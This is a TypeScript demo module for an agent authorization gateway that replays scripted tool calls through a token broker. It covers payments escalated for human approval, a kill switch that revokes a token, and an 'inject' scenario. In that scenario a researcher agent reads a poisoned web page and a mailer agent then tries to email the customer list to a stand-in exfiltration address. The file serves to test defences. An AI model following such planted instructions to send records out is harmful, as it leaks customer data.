// Scripted demo runs: the exact gate calls the Pydantic AI agents make, with no
// LLM in the loop (same idea as scripts/demo_inject.ps1). Each run mints real
// tokens with the orchestrator key and calls real tools, so every step is
// checked by OpenFGA and lands in the audit log like any agent call.
import { broker, detail, type BrokerResponse } from './broker';

export const POISONED_URL = 'https://blog.example.net/agent-security-roundup';
export const EXFIL_ADDRESS = 'records@partner-archive.example';

export type Outcome = 'allow' | 'escalate' | 'deny' | 'error';

export interface Step {
	actor: string;
	action: string;
	outcome: Outcome;
	http: number;
	reason: string;
	auditId?: number;
	sessionTainted?: boolean | null;
}

export interface RunResult {
	scenario: string;
	sessionId?: string;
	steps: Step[];
	/** Set when the last call is waiting for a human. */
	approvalId?: string;
	expiresAt?: string;
	/** What the agent would tell the user. */
	agentSays: string;
	/** Token to keep (httpOnly cookie) for polling or the kill-switch retry. */
	keepToken?: string;
}

interface TokenData {
	access_token: string;
	session_id: string;
	jti: string;
	session_tainted?: boolean;
	tainted_by?: string | null;
}

interface ToolData {
	decision?: string;
	reason?: string;
	audit_id?: number;
	session_tainted?: boolean | null;
	result?: Record<string, unknown> | null;
	approval_id?: string | null;
	expires_at?: string | null;
}

class Run {
	steps: Step[] = [];
	constructor(public scenario: string) {}

	async mint(agent: string, scopes: string[], task: string, sessionId?: string) {
		const r = await broker<TokenData>('/tokens', {
			method: 'POST',
			auth: 'orchestrator',
			body: { agent_id: agent, task, scopes, session_id: sessionId ?? null }
		});
		const ok = r.status === 201 || r.status === 200;
		this.steps.push({
			actor: agent,
			action: `get token [${scopes.join(', ')}]`,
			outcome: ok ? 'allow' : r.status === 0 || r.status >= 500 ? 'error' : 'deny',
			http: r.status,
			reason: ok ? `expires in 10 min · jti ${r.data.jti.slice(0, 8)}…` : detail(r),
			sessionTainted: ok ? (r.data.session_tainted ?? null) : null
		});
		return ok ? r.data : null;
	}

	async call(agent: string, token: string, tool: string, args: Record<string, unknown>, label: string) {
		const r: BrokerResponse<ToolData> = await broker<ToolData>(`/tools/${tool}`, {
			method: 'POST',
			auth: { bearer: token },
			body: { args }
		});
		const d = (r.data ?? {}) as ToolData;
		const outcome: Outcome =
			d.decision === 'allow' || d.decision === 'escalate' || d.decision === 'deny'
				? d.decision
				: r.status === 403 || r.status === 401
					? 'deny'
					: 'error';
		this.steps.push({
			actor: agent,
			action: label,
			outcome,
			http: r.status,
			reason: d.reason ?? detail(r),
			auditId: d.audit_id,
			sessionTainted: d.session_tainted ?? null
		});
		return { outcome, data: d };
	}
}

function explain(outcome: Outcome, reason: string, what: string): string {
	switch (outcome) {
		case 'allow':
			return `Done: ${what}.`;
		case 'escalate':
			return `This needs a human. I've asked for approval in Slack (${reason}) and I'm waiting.`;
		case 'deny':
			return `I couldn't ${what}: AgentGate refused it (${reason}). I won't retry.`;
		default:
			return `Something went wrong calling AgentGate: ${reason}`;
	}
}

async function transfer(amount: number, invoice: string): Promise<RunResult> {
	const run = new Run(amount <= 100 ? 'pay' : 'big');
	const tok = await run.mint('finance', ['transfer_funds'], `Pay invoice ${invoice}`);
	if (!tok) return { scenario: run.scenario, steps: run.steps, agentSays: 'I was not issued a token.' };

	const what = `pay $${amount.toLocaleString('en-US')} for invoice ${invoice}`;
	const { outcome, data } = await run.call(
		'finance',
		tok.access_token,
		'transfer_funds',
		{ amount, to_account: 'acct_acme_supplies', memo: `Invoice ${invoice}` },
		`transfer_funds $${amount.toLocaleString('en-US')} → acct_acme_supplies`
	);
	return {
		scenario: run.scenario,
		sessionId: tok.session_id,
		steps: run.steps,
		approvalId: data.approval_id ?? undefined,
		expiresAt: data.expires_at ?? undefined,
		agentSays: explain(outcome, data.reason ?? '', what),
		keepToken: tok.access_token
	};
}

async function inject(): Promise<RunResult> {
	const run = new Run('inject');

	// 1. Researcher reads an outside page with a hidden instruction. The gate taints the session.
	const r = await run.mint('researcher', ['read_web'], 'Summarise recent agent-security news');
	if (!r) return { scenario: 'inject', steps: run.steps, agentSays: 'Researcher was not issued a token.' };
	await run.call('researcher', r.access_token, 'read_web', { url: POISONED_URL }, `read_web ${POISONED_URL}`);

	// 2. The page text is handed to the mailer, which "follows" it. Same session → still tainted.
	const m = await run.mint(
		'mailer',
		['read_inbox', 'query_customers', 'send_email'],
		'Act on the research notes',
		r.session_id
	);
	if (!m) return { scenario: 'inject', sessionId: r.session_id, steps: run.steps, agentSays: 'Mailer was not issued a token.' };

	const q = await run.call('mailer', m.access_token, 'query_customers', { limit: 25 }, 'query_customers (limit 25)');
	const customers = q.data.result ? JSON.stringify(q.data.result).slice(0, 1500) : '(customer list)';

	const send = await run.call(
		'mailer',
		m.access_token,
		'send_email',
		{ to: EXFIL_ADDRESS, subject: 'Customer records export', body: customers },
		`send_email → ${EXFIL_ADDRESS} (customer list)`
	);
	return {
		scenario: 'inject',
		sessionId: r.session_id,
		steps: run.steps,
		approvalId: send.data.approval_id ?? undefined,
		expiresAt: send.data.expires_at ?? undefined,
		agentSays: explain(send.outcome, send.data.reason ?? '', `email the customer list to ${EXFIL_ADDRESS}`),
		keepToken: m.access_token
	};
}

async function killStart(): Promise<RunResult> {
	const run = new Run('kill-start');
	const m = await run.mint('mailer', ['query_customers', 'send_email'], 'Prepare the weekly newsletter');
	if (!m) return { scenario: 'kill-start', steps: run.steps, agentSays: 'Mailer was not issued a token.' };
	const q = await run.call('mailer', m.access_token, 'query_customers', { limit: 3 }, 'query_customers (limit 3)');
	return {
		scenario: 'kill-start',
		sessionId: m.session_id,
		steps: run.steps,
		agentSays:
			q.outcome === 'allow'
				? 'Mailer holds a live 10-minute token. Now hit its kill switch, then run "Same token again".'
				: explain(q.outcome, q.data.reason ?? '', 'read the customer list'),
		keepToken: m.access_token
	};
}

async function killRetry(token: string | undefined): Promise<RunResult> {
	const run = new Run('kill-retry');
	if (!token) {
		return { scenario: 'kill-retry', steps: [], agentSays: 'No held mailer token. Run "Mailer holds a token" first.' };
	}
	const q = await run.call('mailer', token, 'query_customers', { limit: 3 }, 'query_customers (same token)');
	return {
		scenario: 'kill-retry',
		steps: run.steps,
		agentSays:
			q.outcome === 'deny'
				? `Same token, refused at once: ${q.data.reason ?? 'revoked'}. No restart needed.`
				: explain(q.outcome, q.data.reason ?? '', 'read the customer list'),
		keepToken: token
	};
}

export const SCENARIOS = ['pay', 'big', 'inject', 'kill-start', 'kill-retry'] as const;
export type Scenario = (typeof SCENARIOS)[number];

export function runScenario(s: Scenario, heldToken?: string): Promise<RunResult> {
	switch (s) {
		case 'pay':
			return transfer(40, 'INV-1042');
		case 'big':
			return transfer(5000, 'INV-2077');
		case 'inject':
			return inject();
		case 'kill-start':
			return killStart();
		case 'kill-retry':
			return killRetry(heldToken);
	}
}

/** Poll an approval the way the agent does (with its own token). */
export async function pollApproval(token: string, approvalId: string) {
	const r = await broker<Record<string, unknown>>(`/approvals/${approvalId}`, { auth: { bearer: token } });
	const d = (r.data ?? {}) as Record<string, unknown>;
	const status = String(d.status ?? d.decision ?? '').toLowerCase();
	const reason = typeof d.reason === 'string' ? d.reason : detail(r);

	let state: 'pending' | 'approved' | 'denied' | 'expired' | 'error';
	if (r.status === 403) state = status === 'expired' ? 'expired' : 'denied';
	else if (r.status === 0 || r.status >= 500) state = 'pending'; // transient (cold start); keep polling
	else if (['approved', 'allow'].includes(status)) state = 'approved';
	else if (['denied', 'deny', 'cancelled'].includes(status)) state = 'denied';
	else if (status === 'expired') state = 'expired';
	else if (status === 'pending' || status === 'escalate') state = 'pending';
	else state = r.ok ? 'pending' : 'error';

	const agentSays =
		state === 'approved'
			? 'A human approved it, and AgentGate ran the call.'
			: state === 'denied'
				? `A human refused this (${reason}). I won't retry or look for another way.`
				: state === 'expired'
					? 'Nobody answered in time, so it counts as a no. I stopped.'
					: undefined;
	return { state, http: r.status, reason, agentSays, raw: d };
}
